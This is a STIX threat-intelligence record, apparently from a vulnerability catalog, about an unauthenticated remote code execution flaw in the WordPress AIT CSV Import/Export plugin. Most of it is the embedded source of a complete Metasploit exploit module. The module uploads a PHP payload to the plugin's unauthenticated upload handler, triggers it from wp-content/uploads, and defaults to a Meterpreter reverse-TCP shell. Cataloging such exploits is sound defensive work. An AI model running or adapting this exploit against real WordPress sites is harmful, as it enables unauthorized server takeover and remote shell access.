{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7e08def3-9b23-40be-92b3-e2302da08cc7",
    "created": "2024-08-14T17:09:03.181197Z",
    "modified": "2024-08-14T17:09:03.181201Z",
    "name": "WordPress AIT CSV Import Export Unauthenticated Remote Code Execution",
    "description": " The AIT CSV Import/Export plugin <= 3.0.3 allows unauthenticated remote attackers to upload and execute arbitrary PHP code.  The upload-handler does not require authentication, nor validates the uploaded content.  It may return an error when attempting to parse a CSV, however the uploaded shell is left.  The shell is uploaded to wp-content/uploads/.  The plugin is not required to be activated to be exploitable.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_ait_csv_rce.rb",
            "external_id": "wp_ait_csv_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.ait-themes.club/wordpress-plugins/csv-import-export/#changelog-popup"
        },
        {
            "source_name": "WPVDB",
            "external_id": "10471"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress AIT CSV Import Export Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          The AIT CSV Import/Export plugin <= 3.0.3 allows unauthenticated remote attackers to upload and\n          execute arbitrary PHP code.  The upload-handler does not require authentication, nor validates\n          the uploaded content.  It may return an error when attempting to parse a CSV, however the\n          uploaded shell is left.  The shell is uploaded to wp-content/uploads/.  The plugin is not\n          required to be activated to be exploitable.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          # 0day according to wpvdb\n          'h00die', # msf module\n        ],\n        'References' => [\n          [ 'URL', 'https://www.ait-themes.club/wordpress-plugins/csv-import-export/#changelog-popup' ],\n          [ 'WPVDB', '10471' ]\n        ],\n        'Platform' => [ 'php' ],\n        'Privileged' => false,\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [\n            'AIT CSV Import Export <3.0.4',\n            {\n              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2020-11-14', # 0day detected by wpvdb\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Base path to WordPress installation', '/'])\n      ]\n    )\n  end\n\n  def check\n    return CheckCode::Unknown unless wordpress_and_online?\n\n    # no readme file, just a changelog so we need the version from there\n    changelog = normalize_uri(target_uri.path, 'wp-content', 'plugins', 'ait-csv-import-export', 'changelog.txt')\n    check_version_from_custom_file(changelog, /^v(\\d\\.\\d\\.\\d),/, '3.0.4')\n  end\n\n  def exploit\n    filename = \"#{Rex::Text.rand_text_alphanumeric(6)}.php\"\n    register_file_for_cleanup(filename)\n\n    print_status(\"Uploading payload: #{filename}\")\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(payload.encoded, 'application/octet-stream', nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{filename}\\\"\")\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'ait-csv-import-export', 'admin', 'upload-handler.php'),\n      'method' => 'POST',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data' => post_data.to_s\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect\") unless res\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    print_status('Triggering payload')\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-content', 'uploads', filename)\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-11-14, # 0day detected by wpvdb",
    "x_mitre_platforms": [
        "[ 'php' ]"
    ]
}